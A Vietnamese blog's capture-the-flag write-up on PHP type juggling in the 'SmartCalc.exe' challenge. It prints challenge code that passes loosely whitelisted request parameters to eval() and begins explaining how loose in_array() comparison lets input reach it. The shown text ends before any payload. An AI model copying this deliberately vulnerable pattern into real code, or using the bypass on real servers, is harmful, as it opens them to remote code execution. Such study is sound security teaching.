<!DOCTYPE html>
<html lang="vi">
  <head>
    
    <script type="application/ld+json">

{  
  "@context":"http://schema.org",
  "@type":"Website",
  "@id":"https:\/\/manhnv.com\/",
  "author": {
    "@type": "Person",
    "name": "Manh NV",
    
    "image": "https://manhnv.com/favicon.png"
    
  },
  "name":"Chia sẻ là niềm vui",
  "description":"Hôm này cuối tuần, đang lướt facebook thì thấy một challenge của anh Mạnh Luật đăng về PHP Type Juggling nên vào chiến thử xem thế nào.\nI. Đề bài Các bạn được cung cấp một URL: http:\/\/css.kid.cyberjutsu-lab.tech:9000\/type_juggling_inarray.php?p1=191\u0026amp;p2=7\u0026amp;op=%2a\nĐây là trang web viết bằng PHP (tất nhiên rồi), source code sẽ là: http:\/\/css.kid.cyberjutsu-lab.tech:9000\/type_juggling_inarray.php?debug\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt;  \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt;  \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt;  \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt;  \u0026lt;title\u0026gt;MyApp Home\u0026lt;\/title\u0026gt;  \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;style.",
  "url":"https:\/\/manhnv.com\/post\/ctf\/cyberjutsu\/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe\/",
  "keywords":"[, manhnv, development, cyber security, hacker, CTF, CTF writeup]"
}

</script>
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="generator" content="Hugo 0.95.0 with theme Tranquilpeak 0.5.3-BETA">
<meta name="author" content="Manh NV">
<meta name="keywords" content=", manhnv, development, cyber security, hacker, CTF, CTF writeup">
<meta name="description" content="Hôm này cuối tuần, đang lướt facebook thì thấy một challenge của anh Mạnh Luật đăng về PHP Type Juggling nên vào chiến thử xem thế nào.
I. Đề bài Các bạn được cung cấp một URL: http://css.kid.cyberjutsu-lab.tech:9000/type_juggling_inarray.php?p1=191&amp;p2=7&amp;op=%2a
Đây là trang web viết bằng PHP (tất nhiên rồi), source code sẽ là: http://css.kid.cyberjutsu-lab.tech:9000/type_juggling_inarray.php?debug
&lt;html&gt; &lt;head&gt;  &lt;meta charset=&#34;UTF-8&#34;&gt;  &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;  &lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;ie=edge&#34;&gt;  &lt;title&gt;MyApp Home&lt;/title&gt;  &lt;link rel=&#34;stylesheet&#34; href=&#34;style.">


<meta property="og:description" content="Hôm này cuối tuần, đang lướt facebook thì thấy một challenge của anh Mạnh Luật đăng về PHP Type Juggling nên vào chiến thử xem thế nào.
I. Đề bài Các bạn được cung cấp một URL: http://css.kid.cyberjutsu-lab.tech:9000/type_juggling_inarray.php?p1=191&amp;p2=7&amp;op=%2a
Đây là trang web viết bằng PHP (tất nhiên rồi), source code sẽ là: http://css.kid.cyberjutsu-lab.tech:9000/type_juggling_inarray.php?debug
&lt;html&gt; &lt;head&gt;  &lt;meta charset=&#34;UTF-8&#34;&gt;  &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;  &lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;ie=edge&#34;&gt;  &lt;title&gt;MyApp Home&lt;/title&gt;  &lt;link rel=&#34;stylesheet&#34; href=&#34;style.">
<meta property="og:type" content="article">
<meta property="og:title" content="Write up - THỬ THÁCH NGÀY 1: PHP TYPE JUGGLING “_SMARTCALC.EXE_”">
<meta name="twitter:title" content="Write up - THỬ THÁCH NGÀY 1: PHP TYPE JUGGLING “_SMARTCALC.EXE_”">
<meta property="og:url" content="https://manhnv.com/post/ctf/cyberjutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/">
<meta property="twitter:url" content="https://manhnv.com/post/ctf/cyberjutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/">
<meta property="og:site_name" content="Chia sẻ là niềm vui">
<meta property="og:description" content="Hôm này cuối tuần, đang lướt facebook thì thấy một challenge của anh Mạnh Luật đăng về PHP Type Juggling nên vào chiến thử xem thế nào.
I. Đề bài Các bạn được cung cấp một URL: http://css.kid.cyberjutsu-lab.tech:9000/type_juggling_inarray.php?p1=191&amp;p2=7&amp;op=%2a
Đây là trang web viết bằng PHP (tất nhiên rồi), source code sẽ là: http://css.kid.cyberjutsu-lab.tech:9000/type_juggling_inarray.php?debug
&lt;html&gt; &lt;head&gt;  &lt;meta charset=&#34;UTF-8&#34;&gt;  &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;  &lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;ie=edge&#34;&gt;  &lt;title&gt;MyApp Home&lt;/title&gt;  &lt;link rel=&#34;stylesheet&#34; href=&#34;style.">
<meta name="twitter:description" content="Hôm này cuối tuần, đang lướt facebook thì thấy một challenge của anh Mạnh Luật đăng về PHP Type Juggling nên vào chiến thử xem thế nào.
I. Đề bài Các bạn được cung cấp một URL: http://css.kid.cyberjutsu-lab.tech:9000/type_juggling_inarray.php?p1=191&amp;p2=7&amp;op=%2a
Đây là trang web viết bằng PHP (tất nhiên rồi), source code sẽ là: http://css.kid.cyberjutsu-lab.tech:9000/type_juggling_inarray.php?debug
&lt;html&gt; &lt;head&gt;  &lt;meta charset=&#34;UTF-8&#34;&gt;  &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;  &lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;ie=edge&#34;&gt;  &lt;title&gt;MyApp Home&lt;/title&gt;  &lt;link rel=&#34;stylesheet&#34; href=&#34;style.">
<meta property="og:locale" content="vi">

  
    <meta property="article:published_time" content="2022-03-26T00:00:00">
  
  
    <meta property="article:modified_time" content="2022-03-26T00:00:00">
  
  
  
    
      <meta property="article:section" content="ctf">
    
  
  
    
      <meta property="article:tag" content="ctf">
    
  


<meta name="twitter:card" content="summary">







  <meta property="og:image" content="https://manhnv.com/favicon.png">
  <meta property="twitter:image" content="https://manhnv.com/favicon.png">





  <meta property="og:image" content="https://manhnv.com/images/posts/ctf/CyberJutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/thumbnail.png">
  <meta property="twitter:image" content="https://manhnv.com/images/posts/ctf/CyberJutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/thumbnail.png">


    <title>Write up - THỬ THÁCH NGÀY 1: PHP TYPE JUGGLING “_SMARTCALC.EXE_”</title>

    <link rel="icon" href="https://manhnv.com/favicon.png">
    

    

    <link rel="canonical" href="https://manhnv.com/post/ctf/cyberjutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/">

    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha512-H9jrZiiopUdsLpg94A333EfumgUBpO9MdbxStdeITo+KEIMaNfHNvwyjjDJb+ERPaRS6DpyRlKbvPUasNItRyw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    
    
    
    <link rel="stylesheet" href="https://manhnv.com/css/style-h6ccsoet3mzkbb0wngshlfbaweimexgqcxj0h5hu4h82olsdzz6wmqdkajm.min.css" />
    
    
      
        <link rel="stylesheet"  href="https://manhnv.com/css/mystyle.css">
      
    

    
      
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-128983514-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
    
    
  </head>

  <body>
    <div id="blog">
      <header id="header" data-behavior="5">
  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
  <div class="header-title">
    <a class="header-title-link" href="https://manhnv.com/" aria-label="Tới trang chủ">Chia sẻ là niềm vui</a>
  </div>
  
    
      <a class="header-right-picture "
         href="https://manhnv.com/#about" aria-label="Mở liên kết: /#about">
    
    
    
      
        <img class="header-picture" src="https://manhnv.com/favicon.png" alt="Ảnh đại diện" />
      
    
    </a>
  
</header>

      <nav id="sidebar" data-behavior="5">
  <div class="sidebar-container">
    
      <div class="sidebar-profile">
        <a href="https://manhnv.com/#about" aria-label="Tìm hiểu thêm về tác giả">
          <img class="sidebar-profile-picture" src="https://manhnv.com/favicon.png" alt="Ảnh đại diện" />
        </a>
        <h4 class="sidebar-profile-name">Manh NV</h4>
        
          <h5 class="sidebar-profile-bio">Chia sẻ là niềm vui</h5>
        
      </div>
    
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://manhnv.com/donate.html" title="Donate">
    
      <i class="sidebar-button-icon fa fa-usd"></i>
      
      <span class="sidebar-button-desc">Donate</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://manhnv.com/" title="Home">
    
      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
      
      <span class="sidebar-button-desc">Trang chủ</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://manhnv.com/categories" title="Categories">
    
      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
      
      <span class="sidebar-button-desc">Danh mục</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://manhnv.com/tags" title="Tags">
    
      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
      
      <span class="sidebar-button-desc">Thẻ thông tin</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://manhnv.com/archives" title="Archives">
    
      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
      
      <span class="sidebar-button-desc">Lưu trữ</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://manhnv.com/#about" title="About">
    
      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
      
      <span class="sidebar-button-desc">Thông tin</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://manhnv.com/copyrights" title="Copyrights">
    
      <i class="sidebar-button-icon fa fa-lg fa-copyright"></i>
      
      <span class="sidebar-button-desc">Copyrights</span>
    </a>
  </li>


    </ul>
    <ul class="sidebar-buttons">
      

    </ul>
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://github.com/0xmanhnv" target="_blank" rel="noopener" title="GitHub">
    
      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
      
      <span class="sidebar-button-desc">GitHub</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://facebook.com/manhnv.sec" target="_blank" rel="noopener" title="Facebook">
    
      <i class="sidebar-button-icon fa fa-lg fa-facebook"></i>
      
      <span class="sidebar-button-desc">Facebook</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://www.youtube.com/channel/UCEY3DBfSDupbSG96jfcSDwQ?sub_confirmation=1" target="_blank" rel="noopener" title="Youtube">
    
      <i class="sidebar-button-icon fa fa-lg fa-youtube"></i>
      
      <span class="sidebar-button-desc">Youtube</span>
    </a>
  </li>


    </ul>
  </div>
</nav>

      

      <div id="main" data-behavior="5"
        class="
               hasCoverMetaIn
               ">
        <article class="post" id="top">
          
          
            <div class="post-header main-content-wrap text-left">
  
    <h1 class="post-title">
      Write up - THỬ THÁCH NGÀY 1: PHP TYPE JUGGLING “_SMARTCALC.EXE_”
    </h1>
  
  
  <div class="postShorten-meta post-meta">
    
      <time datetime="2022-03-26T00:00:00Z">
        
  tháng 3 26, 2022

      </time>
    
    
  
  
    <span>mục</span>
    
      <a class="category-link" href="https://manhnv.com/categories/ctf">ctf</a>
    
  

    |
    <a href="https://manhnv.com/post/ctf/cyberjutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/#post-comments">
	    <i class="fa fa-comments-o" aria-hidden="true"></i>
	    <span class="disqus-comment-count" data-disqus-url="https://manhnv.com/post/ctf/cyberjutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/">First article</span>
	</a>
  </div>

</div>
          
          <div class="post-content markdown">
            <div class="main-content-wrap">
              <p>Hôm này cuối tuần, đang lướt facebook thì thấy một challenge của anh <a href="https://l4w.io/">Mạnh Luật</a> đăng về <code>PHP Type Juggling</code> nên vào chiến thử xem thế nào.</p>
<p><img src="https://manhnv.com/images/posts/ctf/CyberJutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/Screen_Shot_2022-03-26_at_20.35.18.png" alt="Screen Shot 2022-03-26 at 20.35.18.png"></p>
<h2 id="i-đề-bài">I. Đề bài</h2>
<p>Các bạn được cung cấp một URL: <a href="http://css.kid.cyberjutsu-lab.tech:9000/type_juggling_inarray.php?p1=191&amp;p2=7&amp;op=*&amp;fbclid=IwAR2BLMH0RVPMEuLJlESEdEl8dtqLAYD8ZxYcA2IkmvSxLVK55kNE3S2vTjc">http://css.kid.cyberjutsu-lab.tech:9000/type_juggling_inarray.php?p1=191&amp;p2=7&amp;op=%2a</a></p>
<p><img src="https://manhnv.com/images/posts/ctf/CyberJutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/Screen_Shot_2022-03-26_at_20.38.22.png" alt="Screen Shot 2022-03-26 at 20.38.22.png"></p>
<p>Đây là trang web viết bằng PHP (tất nhiên rồi), source code sẽ là: <a href="http://css.kid.cyberjutsu-lab.tech:9000/type_juggling_inarray.php?debug">http://css.kid.cyberjutsu-lab.tech:9000/type_juggling_inarray.php?debug</a></p>
<p><img src="https://manhnv.com/images/posts/ctf/CyberJutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/Screen_Shot_2022-03-26_at_20.39.25.png" alt="Screen Shot 2022-03-26 at 20.39.25.png"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">meta</span> <span style="color:#a6e22e">http</span><span style="color:#f92672">-</span><span style="color:#a6e22e">equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;X-UA-Compatible&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ie=edge&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">MyApp</span> <span style="color:#a6e22e">Home</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;style.css&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">body</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;column&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h1</span><span style="color:#f92672">&gt;&gt;</span><span style="color:#a6e22e">SmartCalc</span><span style="color:#f92672">.</span><span style="color:#a6e22e">exe_</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">h1</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;display_errors&#39;</span>,<span style="color:#e6db74">&#39;On&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;error_reporting&#39;</span>,<span style="color:#e6db74">&#39;E_ALL&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">error_reporting</span>(<span style="color:#66d9ef">E_ALL</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;debug&#39;</span>])) <span style="color:#66d9ef">die</span>(<span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        $whitelist_numbers <span style="color:#f92672">=</span>  <span style="color:#a6e22e">range</span>(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1000</span>);
</span></span><span style="display:flex;"><span>        $whitelist_ops <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;+&#34;</span>,<span style="color:#e6db74">&#34;-&#34;</span>,<span style="color:#e6db74">&#34;*&#34;</span>,<span style="color:#e6db74">&#34;/&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        $param1 <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;p1&#39;</span>];
</span></span><span style="display:flex;"><span>        $param2 <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;p2&#39;</span>];
</span></span><span style="display:flex;"><span>        $operator <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;op&#39;</span>];
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>( <span style="color:#a6e22e">in_array</span>($param1, $whitelist_numbers) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">in_array</span>($param2, $whitelist_numbers) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">in_array</span>($operator, $whitelist_ops) ){
</span></span><span style="display:flex;"><span>            $exec <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>param1<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">${</span>operator<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">${</span>param2<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>            $evalcode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;return </span><span style="color:#e6db74">$exec</span><span style="color:#e6db74">;&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;details&gt;&lt;summary&gt;DEBUG&lt;/summary&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;PHP sẽ thực thi eval code sau đây:&#34;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;pre&gt;</span><span style="color:#e6db74">$evalcode</span><span style="color:#e6db74">&lt;/pre&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;/details&gt;&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Nếu chưa biết về eval có thể đọc ở đây: https://php.net/eval
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">echo</span> $exec <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; = &#34;</span><span style="color:#f92672">.</span> <span style="color:#66d9ef">eval</span>($evalcode);
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Not supported&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;/pre&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;p&gt;👉 &lt;a href=&#34;?p1=191&amp;p2=7&amp;op=*&#34;&gt;example&lt;/a&gt;&lt;br&gt;🤖 &lt;a href=&#34;?debug&#34;&gt;source&lt;/a&gt;&lt;/p&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/body&gt;
</span></span></span></code></pre></div><p>Nhiệm vụ của chúng ta cần là: <code>Nhiệm vụ là Remote Code Execution được server và kiếm được FLAG nhé!</code></p>
<p><img src="https://manhnv.com/images/posts/ctf/CyberJutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/Screen_Shot_2022-03-26_at_20.40.30.png" alt="Screen Shot 2022-03-26 at 20.40.30.png"></p>
<h2 id="ii-phân-tích">II. Phân tích</h2>
<p>Ở source code chúng ta mường tượng ra là: Để có thể <code>Remote Code Execution</code> chúng ta cần đi được vào dòng code  <code>echo $exec . &quot; = &quot;. eval($evalcode);</code> , Vì sao? Vì trong đó có hàm <code>eval()</code>. Nếu ai chưa biết <code>eval()</code> là gì và để làm gì thì tham khảo <a href="https://www.php.net/manual/en/function.eval.php">https://www.php.net/manual/en/function.eval.php</a></p>
<p>Okie, vậy làm sao để chúng ta đi được đến dòng code có sử dụng <code>eval()</code>. Đó là chúng ta cần đi qua được đoạn code sau:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>( <span style="color:#a6e22e">in_array</span>($param1, $whitelist_numbers) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">in_array</span>($param2, $whitelist_numbers) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">in_array</span>($operator, $whitelist_ops) ){
</span></span><span style="display:flex;"><span>            $exec <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>param1<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">${</span>operator<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">${</span>param2<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>            $evalcode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;return </span><span style="color:#e6db74">$exec</span><span style="color:#e6db74">;&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;details&gt;&lt;summary&gt;DEBUG&lt;/summary&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;PHP sẽ thực thi eval code sau đây:&#34;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;pre&gt;</span><span style="color:#e6db74">$evalcode</span><span style="color:#e6db74">&lt;/pre&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;/details&gt;&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Nếu chưa biết về eval có thể đọc ở đây: https://php.net/eval
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">echo</span> $exec <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; = &#34;</span><span style="color:#f92672">.</span> <span style="color:#66d9ef">eval</span>($evalcode);
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Not supported&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span></code></pre></div><p>Phải đi qua được bước kiểm tra điều kiện <code>if</code> . Tức là chúng ta phải làm sao để điều kiện trong <code>if</code> là <code>True</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">in_array</span>($param1, $whitelist_numbers) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">in_array</span>($param2, $whitelist_numbers) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">in_array</span>($operator, $whitelist_ops) <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>
</span></span></code></pre></div><p>Trước khi làm được nó <code>true</code> chúng ta phải biết được thông tin như sau:</p>
<ul>
<li><code>in_array()</code> hoạt động như thế nào? và trong source code trên thì nó đang dùng như thế nào?</li>
</ul>
<p>Trả lời từng thông tin trên nhé:</p>
<ul>
<li><code>in_array</code> — Checks if a value exists in an array (Kiểm tra 1 giá trị có tồn tại trong 1 array hay không? Có giá trị trả về là true, false</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">in_array</span>(<span style="color:#a6e22e">mixed</span> $needle, <span style="color:#66d9ef">array</span> $haystack, <span style="color:#a6e22e">bool</span> $strict <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>)<span style="color:#f92672">:</span> <span style="color:#a6e22e">bool</span>
</span></span></code></pre></div><p>Searches for <strong>needle</strong> in <strong>haystack</strong> using loose comparison unless <strong>strict</strong> is set.</p>
<p>⇒ Tức là nếu set tham số $strict = false thì PHP sẽ sử dụng <code>loose comparison</code>. Vậy là như trong source code chúng ta thấy, nó không set tham số <code>strict</code> nên mặc định nó là false ⇒ <code>loose comparison</code></p>
<p>Vậy chúng ta có 3 điều kiện <code>in_array($param1, $whitelist_numbers)</code>, <code>in_array($param2, $whitelist_numbers)</code>, <code>in_array($operator, $whitelist_ops)</code>. Chúng ta phải làm sao cho cả 3 đều <code>true</code>, vì <code>if</code> sử dụng logic <code>&amp;&amp;</code>.</p>
<p>Bây giờ chúng ta sẽ dựa vào một số kiến thức về PHP Type Juggling, nếu bạn nào chưa biết thì tham khảo <a href="https://www.facebook.com/groups/trungtamhocbaomat/posts/510350200475928/">https://www.facebook.com/groups/trungtamhocbaomat/posts/510350200475928/</a></p>
<p><img src="https://manhnv.com/images/posts/ctf/CyberJutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/277357107_10217497851756866_5692074458277755093_n.jpeg" alt="277357107_10217497851756866_5692074458277755093_n.jpeg"></p>
<p><img src="https://manhnv.com/images/posts/ctf/CyberJutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/277224359_10217497851956871_5913626283653838161_n.jpeg" alt="277224359_10217497851956871_5913626283653838161_n.jpeg"></p>
